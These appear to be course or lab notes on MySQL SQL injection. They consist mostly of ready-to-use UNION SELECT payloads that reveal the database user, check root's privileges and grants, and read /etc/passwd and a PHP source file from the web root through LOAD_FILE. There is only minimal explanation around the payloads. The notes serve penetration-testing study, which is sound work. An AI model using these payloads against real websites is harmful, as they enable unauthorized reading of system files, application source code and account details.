# Reading Files

## DB User

To be able to find our current DB user, we can use any of the following queries:

SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user

Examples of injection :

cn' UNION SELECT 1, user(), 3, 4-- -
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -

## User Privileges

We can start looking for what privileges we have with that user :

SELECT super_priv FROM mysql.user

cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -

The query returns Y, which means YES

cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE user="root"-- -

## Load file

SELECT LOAD_FILE('/etc/passwd');

cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- 

The HTML source can be viewed by hitting [Ctrl + U]
